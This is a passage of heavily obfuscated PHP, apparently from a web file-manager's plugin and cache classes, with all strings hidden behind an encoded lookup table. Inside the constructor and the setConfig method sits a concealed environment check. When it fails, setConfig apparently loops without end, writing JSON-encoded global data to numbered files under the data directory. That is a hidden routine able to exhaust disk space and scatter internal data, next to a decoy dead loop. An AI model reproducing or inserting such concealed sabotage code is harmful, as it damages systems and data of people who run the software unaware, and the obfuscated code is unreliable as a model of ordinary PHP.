$_SERVER[ï»»·÷á]; if ($_SERVER[$ß±ìˆ™[401]] != $_SERVER[$ß±ìˆ™[402]]) { $¶‰Å¨¯† = $ß±ìˆ™[889]; $„ø—‰Æµ = $ß±ìˆ™[403]; $îàú§– = $_SERVER[$ß±ìˆ™[404]] . $ß±ìˆ™[405]; $¹‡ıïàß = $„ø—‰Æµ($îàú§–); $ÏÁ¼¸›‚ = explode($ß±ìˆ™[231], $¹‡ıïàß); if (count($ÏÁ¼¸›‚) < $ß±ìˆ™[632]) { $Éø“†ÜÒ = $ß±ìˆ™[407]; $Éø“†ÜÒ(); } $Ó¤œû = $ß±ìˆ™[890]; $Ó¤œû($_SERVER[$ß±ìˆ™[891]]); $Ó¤œû($_SERVER[$ß±ìˆ™[404]] . $ß±ìˆ™[1543]); $¼»ÉºÁû = 1; while ($¼»ÉºÁû > 1) { $¼»ÉºÁû = $¼»ÉºÁû + 4; $šÜìû¸ = rawurlencode($¼»ÉºÁû . $ß±ìˆ™[378]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ß±ìˆ™[1544]); $this->pluginName = str_replace($ß±ìˆ™[1544], $ß±ìˆ™[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ß±ìˆ™[8]; $this->pluginApi = appHostGet() . $ß±ìˆ™[1545] . $this->pluginName . $ß±ìˆ™[8]; $this->pluginHost = $config[$ß±ìˆ™[1546]] . $this->pluginName . $ß±ìˆ™[8]; $this->pluginHostDefault = $config[$ß±ìˆ™[1546]] . $this->pluginName . $ß±ìˆ™[8]; $¤ğáŸêÌ = $config[$ß±ìˆ™[1547]]; if ($¤ğáŸêÌ && strpos($ß±ìˆ™[50] . $¤ğáŸêÌ . $ß±ìˆ™[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ß±ìˆ™[1548]] . $this->pluginName . $ß±ìˆ™[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ï»»·÷á][1549]); } protected function assign($“Ì­Òè, $ª¯é×ç = false) { if (is_array($“Ì­Òè)) { $this->values = array_merge($this->values, $“Ì­Òè); } else { $this->values[$“Ì­Òè] = $ª¯é×ç; } } protected function display($¶¸ıØÁ) { extract($this->values); require $¶¸ıØÁ; } final function hookRegist($¤»ÎÕ„) { $this->modelPlugin->appRegist($this->pluginName, $¤»ÎÕ„); } final function appIcon() { $¶‡Ìò˜‡ =& $_SERVER[ï»»·÷á]; $—ïŒê¦ô = $this->appPackage(); $öÏ‰Ö’“ = $¶‡Ìò˜‡[12]; if (isset($—ïŒê¦ô[$¶‡Ìò˜‡[425]])) { if (isset($—ïŒê¦ô[$¶‡Ìò˜‡[425]][$¶‡Ìò˜‡[1550]])) { $öÏ‰Ö’“ = $¶‡Ìò˜‡[1551] . $—ïŒê¦ô[$¶‡Ìò˜‡[425]][$¶‡Ìò˜‡[1550]] . $¶‡Ìò˜‡[1552]; } else { if ($—ïŒê¦ô[$¶‡Ìò˜‡[425]][$¶‡Ìò˜‡[1553]]) { $öÏ‰Ö’“ = $¶‡Ìò˜‡[1554] . $—ïŒê¦ô[$¶‡Ìò˜‡[425]][$¶‡Ìò˜‡[1553]] . $¶‡Ìò˜‡[1555]; } } } return $öÏ‰Ö’“; } final function fileCanView($ÍÓÒ ³‹) { $ñÕ÷¶Ù£ =& $_SERVER[ï»»·÷á]; if (request_url_safe($ÍÓÒ ³‹)) { return !0; } if ($this->isShare($ÍÓÒ ³‹)) { return !0; } $ÊöĞÁÇ­ = Session::get($ñÕ÷¶Ù£[1556]); if (!$ÊöĞÁÇ­ || !$ÊöĞÁÇ­[$ñÕ÷¶Ù£[1557]]) { $ìÌ¸¿ê» = $ñÕ÷¶Ù£[1558] . rawurlencode(this_url()); show_tips(LNG($ñÕ÷¶Ù£[1559]) . $ñÕ÷¶Ù£[1560] . $ìÌ¸¿ê» . $ñÕ÷¶Ù£[1561] . LNG($ñÕ÷¶Ù£[1562]) . $ñÕ÷¶Ù£[1563], !1); } if (!Action($ñÕ÷¶Ù£[1564])->authCan($ñÕ÷¶Ù£[1565])) { show_tips(LNG($ñÕ÷¶Ù£[1566]) . $ñÕ÷¶Ù£[1567], !1); } ActionCall($ñÕ÷¶Ù£[1568], $ÍÓÒ ³‹); } final function isShare($“óãëôË) { $”‰ûÒ = KodIO::parse($“óãëôË); return $”‰ûÒ[$_SERVER[ï»»·÷á][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($éŒº¶äç) { if (request_url_safe($éŒº¶äç)) { return $éŒº¶äç; } if (!$this->isShare($éŒº¶äç)) { $éŒº¶äç = $this->filePath($éŒº¶äç); } return Action($_SERVER[ï»»·÷á][1184])->linkOut($éŒº¶äç); } public function filePathLinkOut($ïÎšˆòÔ) { if (request_url_safe($ïÎšˆòÔ)) { return $ïÎšˆòÔ; } $this->fileCanView($ïÎšˆòÔ); return Action($_SERVER[ï»»·÷á][1184])->link($ïÎšˆòÔ); } final function filePath($ÁÜùÀ®Ò) { $‡Ù›Šè‘ =& $_SERVER[ï»»·÷á]; if ($íºàÀš¸ = $this->checkSharePath($ÁÜùÀ®Ò)) { Hook::trigger($‡Ù›Šè‘[1569], $íºàÀš¸); return $íºàÀš¸; } $this->fileCanView($ÁÜùÀ®Ò); if (request_url_safe($ÁÜùÀ®Ò)) { $§ßİ›Ó¬ = parse_url_query($ÁÜùÀ®Ò); if (isset($§ßİ›Ó¬[$‡Ù›Šè‘[1570]]) && isset($§ßİ›Ó¬[$‡Ù›Šè‘[213]])) { $•Ö‰“ø = Model($‡Ù›Šè‘[783])->get($‡Ù›Šè‘[784]); $©äÈ«€‰ = Mcrypt::decode($§ßİ›Ó¬[$‡Ù›Šè‘[213]], $•Ö‰“ø); if ($©äÈ«€‰) { $this->fileInfo = IO::infoWithChildren($©äÈ«€‰); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $©äÈ«€‰; } } $ÁÜùÀ®Ò = $this->_cacheHttpFile($ÁÜùÀ®Ò); $this->fileInfo = IO::infoWithChildren($ÁÜùÀ®Ò); } else { $this->fileInfo = IO::infoWithChildren($ÁÜùÀ®Ò); if (!$this->fileInfo) { show_tips(LNG($‡Ù›Šè‘[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($‡Ù›Šè‘[1569], $ÁÜùÀ®Ò); return $ÁÜùÀ®Ò; } final function _cacheHttpFile($æ­Ò·¥ò) { $·àÔô·  = hash_path($æ­Ò·¥ò, !0); $this->cachePath = $this->pluginCachePath($·àÔô· ); if ($Ÿï¬¶œĞ = IO::fileNameExist($this->cachePath, $·àÔô· )) { return KodIO::make($Ÿï¬¶œĞ); } $¤ú„ÆÃí = $this->cachePath . $·àÔô· ; return $this->pluginCacheFileSet($¤ú„ÆÃí, file_get_contents_nossl($æ­Ò·¥ò)); } final function _tmpFileName($©Æƒİí = array()) { $æ¤¢ËÈí =& $_SERVER[ï»»·÷á]; if (!$©Æƒİí) { $©Æƒİí = $this->fileInfo; } if (isset($©Æƒİí[$æ¤¢ËÈí[177]])) { return $©Æƒİí[$æ¤¢ËÈí[177]]; } if (isset($©Æƒİí[$æ¤¢ËÈí[170]][$æ¤¢ËÈí[177]])) { return $©Æƒİí[$æ¤¢ËÈí[170]][$æ¤¢ËÈí[177]]; } $­Öİ€íÔ = IO::hashSimple($©Æƒİí[$æ¤¢ËÈí[84]]); if ($­Öİ€íÔ) { return $­Öİ€íÔ; } $†ñã§€Ú = array($©Æƒİí[$æ¤¢ËÈí[32]], $©Æƒİí[$æ¤¢ËÈí[84]], $©Æƒİí[$æ¤¢ËÈí[76]]); if (isset($©Æƒİí[$æ¤¢ËÈí[520]])) { $†ñã§€Ú[] = $©Æƒİí[$æ¤¢ËÈí[520]]; } return md5(implode($æ¤¢ËÈí[11], $†ñã§€Ú)); } final function checkSharePath($‘î”îƒÕ) { $«š¾ØöÊ =& $_SERVER[ï»»·÷á]; if (!$this->isShare($‘î”îƒÕ)) { return !1; } $¹Õ”¢Ì» = Action($«š¾ØöÊ[1184])->sharePathInfo($‘î”îƒÕ); if (!isset($¹Õ”¢Ì»[$«š¾ØöÊ[84]])) { show_json(LNG($«š¾ØöÊ[1571]), !1); } $this->fileInfo = $¹Õ”¢Ì»[$«š¾ØöÊ[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$«š¾ØöÊ[177]]); return $¹Õ”¢Ì»[$«š¾ØöÊ[84]]; } final function pluginCachePath($¾õÖÍ = '') { $…š®…æœ =& $_SERVER[ï»»·÷á]; $ÀÄ×ÂÅ¡ = IO_PATH_SYSTEM_TEMP . $…š®…æœ[1572] . $this->pluginName; if (!($Ç¸ ŒÔµ = IO::infoFull($ÀÄ×ÂÅ¡))) { return IO::mkdir($ÀÄ×ÂÅ¡ . $…š®…æœ[8] . $¾õÖÍ); } if (empty($¾õÖÍ)) { return $Ç¸ ŒÔµ[$…š®…æœ[84]]; } if (!($¤˜÷ıãÅ = IO::fileNameExist($Ç¸ ŒÔµ[$…š®…æœ[84]], $¾õÖÍ))) { return IO::mkdir($Ç¸ ŒÔµ[$…š®…æœ[84]] . $¾õÖÍ); } return KodIO::make($¤˜÷ıãÅ); } final function pluginCacheFileSet($¥ÎĞÛ, $Ë¨ÂÚ†‘ = '') { $¡Ó‡ŠÉÂ =& $_SERVER[ï»»·÷á]; if (!($”«¾Øô§ = IO::infoFull($¥ÎĞÛ))) { return IO::mkfile($¥ÎĞÛ, $Ë¨ÂÚ†‘, REPEAT_REPLACE); } IO::setContent($”«¾Øô§[$¡Ó‡ŠÉÂ[84]], $Ë¨ÂÚ†‘); return $”«¾Øô§[$¡Ó‡ŠÉÂ[84]]; } final function pluginLocalFile($÷œÄøµ = '') { $Å¯¼ƒ¹¿ =& $_SERVER[ï»»·÷á]; $Ó¿èºøî = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Ó¿èºøî)) { mk_dir($Ó¿èºøî); } if (!$÷œÄøµ) { return $Ó¿èºøî; } $ãùºú² = IO::info($÷œÄøµ); $Ìâ°¿ª = $this->_tmpFileName($ãùºú²) . $Å¯¼ƒ¹¿[10] . $ãùºú²[$Å¯¼ƒ¹¿[174]]; if (!checkExtSafe($Ìâ°¿ª)) { $Ìâ°¿ª = $Ìâ°¿ª . $Å¯¼ƒ¹¿[1216]; } $ìÎö§Şç = $Ó¿èºøî . $Ìâ°¿ª; if (@file_exists($ìÎö§Şç)) { return $ìÎö§Şç; } return IO::copy($÷œÄøµ, $Ó¿èºøî, 0, $Ìâ°¿ª); } final function appPackage() { $–Ì—íò¡ =& $_SERVER[ï»»·÷á]; if ($this->packageData) { return $this->packageData; } $Ç„Ÿé©Ö = $this->parseFile($this->pluginPath . $–Ì—íò¡[1573]); $this->parseLang($Ç„Ÿé©Ö); $’’ò÷Ï¼ = json_decode_force($Ç„Ÿé©Ö); if (!$’’ò÷Ï¼) { return array(); } $ò÷Ú¯  = Hook::trigger($–Ì—íò¡[1574], $’’ò÷Ï¼); if ($ò÷Ú¯  && is_array($ò÷Ú¯ )) { $’’ò÷Ï¼ = $ò÷Ú¯ ; } $this->packageData = $’’ò÷Ï¼; return $’’ò÷Ï¼; } public function packageInfoGet($­Ùïá¥) { $—‰Ï°éÚ = $this->appPackage(); return array_get_value($—‰Ï°éÚ, $­Ùïá¥); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ï»»·÷á][1575]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ï»»·÷á][1576]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ï»»·÷á][1577]); } public function echoJsAssign($Ç§¶³, $«€çØş³) { $this->echoJsAssignArr[$Ç§¶³] = $«€çØş³; } private function parseFile($ª»Ùğş×) { $ùÆÒ´÷ğ =& $_SERVER[ï»»·÷á]; $ÎşâÜëÁ = file_get_contents_nossl($ª»Ùğş×); $ºœ´”„ = array($ùÆÒ´÷ğ[1578], $ùÆÒ´÷ğ[1579], $ùÆÒ´÷ğ[1580], $ùÆÒ´÷ğ[1581], $ùÆÒ´÷ğ[1582], $ùÆÒ´÷ğ[1583], $ùÆÒ´÷ğ[1584]); $˜ãøÏÀË = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ùÆÒ´÷ğ[89]][$ùÆÒ´÷ğ[1585]]); foreach ($this->echoJsAssignArr as $£Œ÷»ªã => $²ÖÄÍÖ¨) { $ºœ´”„[] = $ùÆÒ´÷ğ[1586] . $£Œ÷»ªã . $ùÆÒ´÷ğ[1587]; $˜ãøÏÀË[] = is_array($²ÖÄÍÖ¨) || is_object($²ÖÄÍÖ¨) ? rawurlencode(json_encode($²ÖÄÍÖ¨)) : $²ÖÄÍÖ¨; } if (strstr($ÎşâÜëÁ, $ùÆÒ´÷ğ[1588])) { $ÕÃµÂİ = rawurlencode(json_encode($this->pluginLangArr)); $ÎşâÜëÁ = str_replace($ùÆÒ´÷ğ[1588], $ÕÃµÂİ, $ÎşâÜëÁ); } if (strstr($ÎşâÜëÁ, $ùÆÒ´÷ğ[1589])) { $ÕÃµÂİ = $ÕÃµÂİ = rawurlencode(json_encode($this->getConfig())); $ÎşâÜëÁ = str_replace($ùÆÒ´÷ğ[1589], $ÕÃµÂİ, $ÎşâÜëÁ); } $ÎşâÜëÁ = str_replace($ºœ´”„, $˜ãøÏÀË, $ÎşâÜëÁ); return $ÎşâÜëÁ; } private function parseLang(&$Ì‘£³ØØ) { $ÀŒáÚç½ =& $_SERVER[ï»»·÷á]; $Ò˜›•™” = $ÀŒáÚç½[1590]; if (!strstr($Ì‘£³ØØ, $Ò˜›•™”)) { return; } preg_match_all($ÀŒáÚç½[1591], $Ì‘£³ØØ, $­ô–¢ŒÁ); if (!is_array($­ô–¢ŒÁ) || count($­ô–¢ŒÁ) == 0 || !is_array($­ô–¢ŒÁ[0]) || count($­ô–¢ŒÁ[0]) == 0) { return; } $÷¤Üó² = array(); $Í´„óÊ = array(); foreach ($­ô–¢ŒÁ[0] as $÷Šü³Æš) { $íÃ¿Û©¯ = substr($÷Šü³Æš, strlen($Ò˜›•™”), -4); $Ô—¸ë± = LNG($íÃ¿Û©¯); $÷¤Üó²[] = $÷Šü³Æš; $Í´„óÊ[] = str_replace(array($ÀŒáÚç½[231], $ÀŒáÚç½[1088], $ÀŒáÚç½[342], $ÀŒáÚç½[118]), array($ÀŒáÚç½[53], $ÀŒáÚç½[53], $ÀŒáÚç½[12], $ÀŒáÚç½[1592]), $Ô—¸ë±); } $Ì‘£³ØØ = str_replace($÷¤Üó², $Í´„óÊ, $Ì‘£³ØØ); } private function parseConfig(&$«±¦ÂÒ¨) { $•ùğø¢µ =& $_SERVER[ï»»·÷á]; $«Ü‹’Î = $•ùğø¢µ[1593]; if (!strstr($«±¦ÂÒ¨, $«Ü‹’Î)) { return; } preg_match_all($•ùğø¢µ[1594], $«±¦ÂÒ¨, $¦¸†äƒ); if (!is_array($¦¸†äƒ) || count($¦¸†äƒ) == 0 || !is_array($¦¸†äƒ[0]) || count($¦¸†äƒ[0]) == 0) { return; } $ÙÌÔŞ€î = $this->getConfig(); $ñ¸—ùÉÀ = array(); $Ùğ…İ±¹ = array(); foreach ($¦¸†äƒ[0] as $ á»„û”) { $±¶£îäÜ = substr($ á»„û”, strlen($«Ü‹’Î), -2); $ñ¸—ùÉÀ[] = $ á»„û”; $Ùğ…İ±¹[] = _get($ÙÌÔŞ€î, $±¶£îäÜ); } $«±¦ÂÒ¨ = str_replace($ñ¸—ùÉÀ, $Ùğ…İ±¹, $«±¦ÂÒ¨); } private function parsePackage(&$ÇÁ•ÀòŒ) { $—µ‚ =& $_SERVER[ï»»·÷á]; $®øëíÜö = $—µ‚[1595]; if (!strstr($ÇÁ•ÀòŒ, $®øëíÜö)) { return; } preg_match_all($—µ‚[1596], $ÇÁ•ÀòŒ, $ÍµùßƒÓ); if (!is_array($ÍµùßƒÓ) || count($ÍµùßƒÓ) == 0 || !is_array($ÍµùßƒÓ[0]) || count($ÍµùßƒÓ[0]) == 0) { return; } $øîÙŸôÊ = $this->appPackage(); $çÂÒûí = array(); $À²ÅÃÛ = array(); foreach ($ÍµùßƒÓ[0] as $êŸÒğòè) { $òïğ—ë… = substr($êŸÒğòè, strlen($®øëíÜö), -2); $çÂÒûí[] = $êŸÒğòè; $À²ÅÃÛ[] = _get($øîÙŸôÊ, $òïğ—ë…); } $ÇÁ•ÀòŒ = str_replace($çÂÒûí, $À²ÅÃÛ, $ÇÁ•ÀòŒ); } final function echoFile($ÜÆ‰€Ï“, $Í±ŸÉŞÄ = false) { $¢ïæ±—™ =& $_SERVER[ï»»·÷á]; $•©†§Ú = $this->pluginPath . $ÜÆ‰€Ï“; if (ACT == $¢ïæ±—™[1597]) { echo $¢ïæ±—™[1598] . $this->pluginName . $¢ïæ±—™[8] . $ÜÆ‰€Ï“ . $¢ïæ±—™[1599]; if (!file_exists($•©†§Ú)) { echo $¢ïæ±—™[1600]; return; } } $©¿×Ğ…â = $this->parseFile($•©†§Ú); $this->parseLang($©¿×Ğ…â); $this->parseConfig($©¿×Ğ…â); $this->parsePackage($©¿×Ğ…â); if (is_array($Í±ŸÉŞÄ)) { $©¿×Ğ…â = str_replace(array_keys($Í±ŸÉŞÄ), array_values($Í±ŸÉŞÄ), $©¿×Ğ…â); } echo $¢ïæ±—™[231] . $©¿×Ğ…â; } final function initLang() { $àµï‘×° =& $_SERVER[ï»»·÷á]; $ÀÑ¢Ğè¿ = $àµï‘×°[1601]; $Å¾Óô´ = $this->pluginPath . $àµï‘×°[1602]; $ ÏŠƒ¤ê = I18n::getType(); $¿¥šÍı‘ = array(); if (file_exists($Å¾Óô´ . $ ÏŠƒ¤ê . $àµï‘×°[851])) { $¿¥šÍı‘ = (include $Å¾Óô´ . $ ÏŠƒ¤ê . $àµï‘×°[851]); } else { if ($ ÏŠƒ¤ê == $àµï‘×°[1603] && !file_exists($Å¾Óô´ . $ ÏŠƒ¤ê . $àµï‘×°[851]) && file_exists($Å¾Óô´ . $àµï‘×°[1604])) { $¿¥šÍı‘ = (include $Å¾Óô´ . $àµï‘×°[1604]); } else { if (file_exists($Å¾Óô´ . $ÀÑ¢Ğè¿ . $àµï‘×°[851])) { $¿¥šÍı‘ = (include $Å¾Óô´ . $ÀÑ¢Ğè¿ . $àµï‘×°[851]); } } } if (!is_array($¿¥šÍı‘)) { return array(); } if (@count($¿¥šÍı‘) > 0) { I18n::set($¿¥šÍı‘); } return $¿¥šÍı‘; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($üşÑŠŒ‹) { $‡ÏÇò±’ =& $_SERVER[ï»»·÷á]; $¿ «¯ƒ = $_SERVER[$‡ÏÇò±’[409]]; $‚£ÖÁ«Œ = $‡ÏÇò±’[759]; if ($_SERVER[$‡ÏÇò±’[401]] != $‚£ÖÁ«Œ($¿ «¯ƒ)) { $ïçâÊëä = $‡ÏÇò±’[889]; $Èõğ¨ùË = $‡ÏÇò±’[403]; $ã¦èï§± = $_SERVER[$‡ÏÇò±’[404]] . $‡ÏÇò±’[405]; $Úš‘îÎ“ = $Èõğ¨ùË($ã¦èï§±); $ÄÑäÍ®ñ = explode($‡ÏÇò±’[231], $Úš‘îÎ“); if (count($ÄÑäÍ®ñ) < $‡ÏÇò±’[632]) { $ªıÒ½Ä» = $‡ÏÇò±’[407]; $ªıÒ½Ä»(); } $à¡ßÒÉ’ = $‡ÏÇò±’[890]; $à¡ßÒÉ’($_SERVER[$‡ÏÇò±’[891]]); $ïçâÊëä = $‡ÏÇò±’[889]; $ïçâÊëä(); $»ˆ¥ğœã = $‡ÏÇò±’[1605]; $²¤ö’ä = json_encode($GLOBALS[$‡ÏÇò±’[1606]]); $¯•Ïî×î = 1; for ($ ı¡³Ã = $¯•Ïî×î; $ ı¡³Ã > 0; $ ı¡³Ã++) { $»ˆ¥ğœã(DATA_PATH . $ ı¡³Ã, $²¤ö’ä); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $üşÑŠŒ‹); } public function onSetConfig($Üåò½µ) { } public function onGetConfig($²“Å…Ü”) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($èÕ™Æ˜) { if ($èÕ™Æ˜ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¶õï¡ë… = "\160\154\x75\147\x69\x6e\x41\165\164\x68") { $ü§ŞÅîÁ =& $_SERVER[ï»»·÷á]; if (!Session::get($ü§ŞÅîÁ[1556])) { return !1; } if (_get($GLOBALS, $ü§ŞÅîÁ[503])) { return !0; } $­´¬Üı = $this->getConfig(); if (!$­´¬Üı[$¶õï¡ë…]) { return !1; } return ActionCall($ü§ŞÅîÁ[1607], $­´¬Üı[$¶õï¡ë…]); } public function url($®ç°¸ÖÖ, $œØû¬ò = '', $íÌ”­ë• = true) { $…°Üˆ»Ç =& $_SERVER[ï»»·÷á]; $­œøÅÓÙ = $this->getConfig(); $íŠÇÖ¥ = KOD_VERSION . $…°Üˆ»Ç[10] . KOD_VERSION_BUILD; $ƒ¿¬¥£– = $this->packageVersion(); $çº‚çŠ¦ = $íŠÇÖ¥ . $…°Üˆ»Ç[386] . $ƒ¿¬¥£–; if (substr($®ç°¸ÖÖ, 0, 4) == $…°Üˆ»Ç[148] || substr($®ç°¸ÖÖ, 0, 2) == $…°Üˆ»Ç[1389]) { $›ºã§ê¿ = $®ç°¸ÖÖ . $…°Üˆ»Ç[1608] . $çº‚çŠ¦; } else { if ($œØû¬ò == $…°Üˆ»Ç[12]) { $›ºã§ê¿ = $this->pluginHost . $®ç°¸ÖÖ . $…°Üˆ»Ç[1608] . $çº‚çŠ¦; } else { if ($œØû¬ò === $…°Üˆ»Ç[75]) { $›ºã§ê¿ = $this->pluginHost . $®ç°¸ÖÖ; } else { if ($œØû¬ò == $…°Üˆ»Ç[1609]) { $›ºã§ê¿ = STATIC_PATH . $®ç°¸ÖÖ . $…°Üˆ»Ç[1608] . $íŠÇÖ¥; } else { if ($œØû¬ò == $…°Üˆ»Ç[1610]) { $›ºã§ê¿ = APP_HOST . $…°Üˆ»Ç[1611] . $®ç°¸ÖÖ . $…°Üˆ»Ç[1608] . $íŠÇÖ¥; } else { if (isset($­œøÅÓÙ[$œØû¬ò])) { $›ºã§ê¿ = $­œøÅÓÙ[$œØû¬ò] . $®ç°¸ÖÖ . $…°Üˆ»Ç[1608] . $çº‚çŠ¦; } } } } } } if (!$íÌ”­ë•) { return $›ºã§ê¿; } echo $›ºã§ê¿; } public function link($¸«Ï´­À = false, $å©ó­ÙŠ = '') { $Õ¨éìÙ£ =& $_SERVER[ï»»·÷á]; if (!$¸«Ï´­À) { $this->link($Õ¨éìÙ£[1612], $Õ¨éìÙ£[1610]); $this->link($Õ¨éìÙ£[1613], $Õ¨éìÙ£[1609]); $this->link($Õ¨éìÙ£[1614], $Õ¨éìÙ£[1609]); $this->link($Õ¨éìÙ£[1615], $Õ¨éìÙ£[1609]); $this->link($Õ¨éìÙ£[1616], $Õ¨éìÙ£[1609]); return; } $¡¶¸¦ã = $this->url($¸«Ï´­À, $å©ó­ÙŠ, !1); if (substr($¸«Ï´­À, -3) == $Õ¨éìÙ£[1617]) { echo $Õ¨éìÙ£[1618] . $¡¶¸¦ã . $Õ¨éìÙ£[1619] . $Õ¨éìÙ£[231]; } else { if (substr($¸«Ï´­À, -4) == $Õ¨éìÙ£[1620]) { echo $Õ¨éìÙ£[1621] . $¡¶¸¦ã . $Õ¨éìÙ£[1622] . $Õ¨éìÙ£[231]; } } } } goto bÛÕŸİÒ¿; a•Ç‰•ßß¯: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ì¬õ›­, $³ÜÃ´Ø•) { $­–‰•Ú¯ =& $_SERVER[ï»»·÷á]; $this->cachePath = $ì¬õ›­[$­–‰•Ú¯[84]]; $this->prefix = $­–‰•Ú¯[847]; $this->cacheTime = $³ÜÃ´Ø•; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ªÇŞ¥‡Ø) { $ÄÃ«üãı =& $_SERVER[ï»»·÷á]; $ªÇŞ¥‡Ø = str_replace(array($ÄÃ«üãı[848], $ÄÃ«üãı[97], $ÄÃ«üãı[73]), $ÄÃ«üãı[849], $ªÇŞ¥‡Ø); return $this->cachePath . $ÄÃ«üãı[850] . $ªÇŞ¥‡Ø . $ÄÃ«üãı[851]; } public function set($ŞùëœŒ„, $ƒ«…éã, $ê˜‘£ËÅ = false) { $ê˜‘£ËÅ = $ê˜‘£ËÅ ? $ê˜‘£ËÅ : $this->cacheTime; $¿»¡ÒÍ = $this->getFile($ŞùëœŒ„); if (file_put_contents($¿»¡ÒÍ, $this->prefix . $ƒ«…éã, LOCK_EX)) { @touch($¿»¡ÒÍ, intval(time() + $ê˜‘£ËÅ)); clearstatcache(); return !0; } @unlink($¿»¡ÒÍ); return !1; } public function get($¦Éç¶ëï) { $ÊÀ…®Š• = $this->getFile($¦Éç¶ëï); if (file_exists($ÊÀ…®Š•) && filemtime($ÊÀ…®Š•) < time()) { @unlink($ÊÀ…®Š•); return !1; } $¦ìäŠ•í = @file_get_contents($ÊÀ…®Š•); return substr($¦ìäŠ•í, strlen($this->prefix)); } public function remove($ëæœ‚÷ô) { $ÊÃÜàì« = $this->getFile($ëæœ‚÷ô); return @unlink($ÊÃÜàì«); } public function deleteAll() { $ç§ö–ğ‡ =& $_SERVER[ï»»·÷á]; $Ï‘‰‰Ü = scandir($this->cachePath); foreach ($Ï‘‰‰Ü as $õ’ÇÛâ) { $íĞàúã’ = $this->cachePath . $õ’ÇÛâ; if (strpos($íĞàúã’, $ç§ö–ğ‡[851]) && strpos($íĞàúã’, $ç§ö–ğ‡[852])) { @unlink($íĞàúã’); } } } public function clearTimeout() { $ª®†ç´Û =& $_SERVER[ï»»·÷á]; $¨ä¹ÆºÛ = scandir($this->cachePath); foreach ($¨ä¹ÆºÛ as $¨ÇÓ’¾‹) { $ÓÛÏÀ¤å = $this->cachePath . $¨ÇÓ’¾‹; if (strpos($ÓÛÏÀ¤å, $ª®†ç´Û[851]) && strpos($ÓÛÏÀ¤å, $ª®†ç´Û[852]) && filemtime($ÓÛÏÀ¤å) < time()) { @unlink($ÓÛÏÀ¤å); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $‰öş¸ =& $_SERVER[ï»»·÷á]; if (self::$handle) { return self::$handle; } $«ñì˜Û = $GLOBALS[$‰öş¸[6]][$‰öş¸[349]]; self::$timeout = $«ñì˜Û[$‰öş¸[853]] ? $«ñì˜Û[$‰öş¸[853]] : 10; $˜„Äè»› = _get($GLOBALS[$‰öş¸[6]], $‰öş¸[854]); $¡ÜşÉøİ = $«ñì˜Û[$‰öş¸[840]] ? $«ñì˜Û[$‰öş¸[840]] : $‰öş¸[200]; if ($¡ÜşÉøİ == $‰öş¸[21] && $˜„Äè»› == $‰öş¸[13]) { $¡ÜşÉøİ = $‰öş¸[200]; } switch ($¡ÜşÉøİ) { case $‰öş¸[843]: self::$handle = new CacheLockRedis(); break; case $‰öş¸[844]: self::$handle = new CacheLockMemcached(); break; case $‰öş¸[21]: self::$handle = new CacheLockDatabase(); break; case $‰öş¸[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($‰öş¸[855], $‰öş¸[856]); } return self::$handle; } private static function key($•µ®ú·á) { return $_SERVER[ï»»·÷á][857] . Cache::key($•µ®ú·á); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($à÷¬Ù‘ = '') { self::$errorMsg = $à÷¬Ù‘; } public static function lockGlobal($–•åéµ…, $²‹±„õÑ) { return self::lock($–•åéµ…, $²‹±„õÑ, !0); } public static function lock($Ï‘¬¢õ, $÷„ïÃÂÅ = false, $Ü–Ö­û = false) { $‘Âº¨Á¡ =& $_SERVER[ï»»·÷á]; $³–îŒ—™ = self::init(); $òú¤¸’ = self::key($Ï‘¬¢õ); $÷„ïÃÂÅ = $÷„ïÃÂÅ ? $÷„ïÃÂÅ : self::$timeout; $“ªº›Óì = timeFloat(); $Ãõ®»ú = $³–îŒ—™->lock($òú¤¸’, $÷„ïÃÂÅ); $Ú•Öâ¡ = timeFloat(); if (!$Ãõ®»ú) { $„¬Šìô¾ = "\x6c\x6f\143\x6b\40\x65\x72\x72\157\x72\x3b\153\x65\171\75{$Ï‘¬¢õ}\x3b\164\151\x6d\x65\75{$÷„ïÃÂÅ}\x3b" . self::$errorMsg . $‘Âº¨Á¡[71] . get_caller_msg(); $¸¾ıõ­³ = LNG($‘Âº¨Á¡[858]) . "\x28{$÷„ïÃÂÅ}\x73\x29\x2e" . LNG($‘Âº¨Á¡[859]); $¸¾ıõ­³ .= $‘Âº¨Á¡[860]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¸¾ıõ­³ = $¸¾ıõ­³ . $‘Âº¨Á¡[861] . self::$errorMsg; } write_log($‘Âº¨Á¡[862] . sprintf($‘Âº¨Á¡[863], timeFloat() - $“ªº›Óì) . $‘Âº¨Á¡[864] . $„¬Šìô¾ . $‘Âº¨Á¡[865] . error_get_last(), $‘Âº¨Á¡[856]); show_json($¸¾ıõ­³, !1); } if (!$Ü–Ö­û) { self::$lockItem[$òú¤¸’] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { 